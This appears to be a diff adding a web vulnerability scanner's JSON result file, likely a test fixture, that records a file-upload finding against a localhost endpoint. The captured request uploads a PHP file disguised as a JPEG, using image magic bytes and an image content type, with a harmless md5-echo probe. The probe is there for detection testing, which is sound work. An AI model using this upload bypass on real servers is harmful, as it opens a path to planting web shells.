@@ -1,0 +1,34 @@
+[
+  {
+    "create_time": 1703966213671,
+    "detail": {
+      "addr": "http://localhost:8080/myfile",
+      "payload": "",
+      "snapshot": [
+        [
+          "POST /myfile HTTP/1.1\r\nHost: localhost:8080\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\r\nContent-Length: 264\r\nContent-Type: multipart/form-data; boundary=fdba2820e615f8abe1b779a5eae21613a10a9ef1c464a057f9ffccc2ffc6\r\nReferer: http://localhost:8080/\r\nAccept-Encoding: gzip\r\n\r\n--fdba2820e615f8abe1b779a5eae21613a10a9ef1c464a057f9ffccc2ffc6\r\nContent-Disposition: form-data; name=\"file\"; filename=\"ZtG0ykIj.php\"\r\nContent-Type: image/jpeg\r\n\r\n\\xff\\xd8<?php echo md5('bdlu2jxP'); ?>\\xff\\xd9\r\n--fdba2820e615f8abe1b779a5eae21613a10a9ef1c464a057f9ffccc2ffc6--\r\n",
+          "HTTP/1.1 200 OK\r\nContent-Length: 19\r\nContent-Type: text/plain; charset=utf-8\r\nDate: Sat, 30 Dec 2023 19:56:53 GMT\r\n\r\n文件上传成功\n"
+        ]
+      ],
+      "extra": {
+        "param": {
+          "key": "file",
+          "position": "body",
+          "value": ""
+        }
+      }
+    },
+    "plugin": "upload/upload/default",
+    "target": {
+      "url": "http://localhost:8080/myfile",
+      "params": [
+        {
+          "position": "body",
+          "path": [
+            "file"
+          ]
+        }
+      ]
+    }
+  }
+]
